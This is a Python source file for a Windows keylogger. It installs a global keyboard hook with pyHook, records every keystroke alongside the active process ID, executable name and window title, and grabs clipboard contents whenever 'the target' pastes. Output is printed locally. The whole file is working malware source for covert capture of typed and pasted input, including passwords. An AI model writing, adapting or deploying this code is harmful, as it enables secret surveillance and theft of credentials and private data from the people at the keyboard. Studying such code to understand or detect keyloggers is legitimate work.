from ctypes import *
import pythoncom

# pyhook doesnt have a python 3.8 version
import pyHook

import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # get active window handle
    hwnd = user32.GetForegroundWindow()

    # get process id
    pid = c_ulong(0)

    # pass handle to get pid
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value

    executable = create_string_buffer("\x00" * 512)

    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    # find the actual executable name of the process
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer("\x00" * 512)

    # grab full text of windows title bar
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    print("")
    print("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
    print("")

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # check if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if a standard key is pressed
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii))
    else:
        # if they paste something then get the value of the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % pasted_value)
        else:
            print("[%s]" % event.Key)
    return True


kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# whenever the target presses on the keyboard, keystroke function called with event object as parameter
kl.HookKeyboard()

pythoncom.PumpMessages()
